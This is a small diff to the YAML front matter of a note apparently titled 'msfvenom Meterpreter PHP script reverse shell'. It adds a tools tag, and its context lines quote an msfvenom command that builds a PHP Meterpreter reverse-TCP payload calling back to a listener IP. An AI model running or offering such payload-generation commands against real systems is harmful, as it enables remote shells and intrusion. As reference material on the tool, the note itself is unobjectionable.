@@ -17,6 +17,8 @@ output: 'root@hackers:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.16
   Payload size: 1115 bytes'
 created_at: '2019-09-17T17:31:17.996755+00:00'
 updated_at: '2023-05-29T16:48:52.884824+00:00'
+tools:
+- '[[msfvenom]]'
 ---
 
 # msfvenom Meterpreter PHP script reverse shell
